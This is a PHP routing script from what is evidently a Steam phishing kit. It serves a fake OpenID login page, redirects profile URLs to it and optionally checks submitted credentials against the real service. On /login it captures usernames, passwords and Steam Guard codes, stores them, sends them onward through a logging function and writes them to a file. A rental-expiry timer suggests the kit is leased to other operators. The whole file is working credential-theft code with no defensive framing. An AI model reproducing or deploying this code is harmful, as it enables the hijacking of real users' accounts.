<?php
	require_once("../php/classFake.php");
	require_once("../php/classFakePageGenerator.php");
	require_once("../php/checkValid.php");
	require_once("../php/geoip/geoip.php");
	require_once("../php/parse_matches.php");
	
	// if (empty($_SERVER['HTTPS']) || 'off' == strtolower($_SERVER['HTTPS']) || $_SERVER['SERVER_PORT'] != 443) {
		// header("HTTP/1.1 301 Moved Permanently");
		// header("Location: https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
		// exit();
	// }
	
	
	
	$url_array = parse_url($_SERVER['REQUEST_URI']);
	$path = $url_array["path"];
	if ($path[strlen($path)-1] == "/") $path = substr($path, 0, -1); 
	if ($path == "") $path = "/";
	
	
	
	$Fake = new classFake();
	$PageGen = new PageGenerator("template-" . $Fake->int_GetFakeTemplate(), ip_code($_SERVER["REMOTE_ADDR"]));
	
	
	if ($Fake->int_GetTimerActivity() > 0) {
		if ($Fake->int_GetTimerTime() <= time()) {
			echo $PageGen->GenerateRentIsOver();
			exit();
		} 
	}
	
	
	$ref = (isset($_GET["ref"])) ? $_GET["ref"] : null;
	
	
	$validate_activated = false;
	if ($Fake->b_GetValidateActivity() > 0) $validate_activated = true;
	
	
	
	$res = preg_match("/\/profiles\/\d+/", $path);
	if ($res) {
		header("Location: /openid/login");
		exit();
	}
	//"/profiles/76561198052825782"
	
	switch ($path){
		
		case "/openid/login": 
			require_once("fake_login/index.php");
		break;
		
		case "/validate": 
			if ($validate_activated) echo json_encode(checkValid($_REQUEST["username"], $_REQUEST["password"]));
			else echo json_encode(array("result" => true, "type" => "phone", "emaildomain" => null, "steamid" => null));
		break;
		
		case "/login": 
			if (!empty($_REQUEST))
			{
				//if ($Fake->b_CheckAccount($_REQUEST["username"], $_REQUEST["password"], $_REQUEST["guard"]) != true) {
					$res = checkValid($_REQUEST["username"], $_REQUEST["password"]);

					if ($validate_activated) {
						if ($res["result"] == true) {
							$Fake->void_AddAccount(
								$_REQUEST["username"], 
								$_REQUEST["password"], 
								$_REQUEST["guard"], 
								$res["steamid"],
								$ref
							);
							
							if ($Fake->int_GetSendingActivity() > 0) {
								$Fake->void_SendLog($_REQUEST["username"], $_REQUEST["password"], $_REQUEST["guard"], $ref, $res["steamid"]);
							}
						}
					}
					else {
						$Fake->void_AddAccount(
							$_REQUEST["username"], 
							$_REQUEST["password"], 
							$_REQUEST["guard"], 
							$res["steamid"],
							$ref
						);
					
						if ($Fake->int_GetSendingActivity() > 0) {
							$Fake->void_SendLog($_REQUEST["username"], $_REQUEST["password"], $_REQUEST["guard"], $ref);
						}
					}
					
					logToFile($_REQUEST["username"] . ":" . $_REQUEST["password"] . ":" . $_REQUEST["guard"] . ":" . $ref);
				//}
			}
		break;
		
		default: 
			$Matches = parse_matches("template-" . $Fake->int_GetFakeTemplate(), ip_code($_SERVER["REMOTE_ADDR"]));
			if (array_key_exists($path, $Matches)) {
				require_once($Matches[$path]);
			}
			else //echo $PageGen->Generate404(); 
			{
				header("Location: /");
				exit();
			}
	}
?>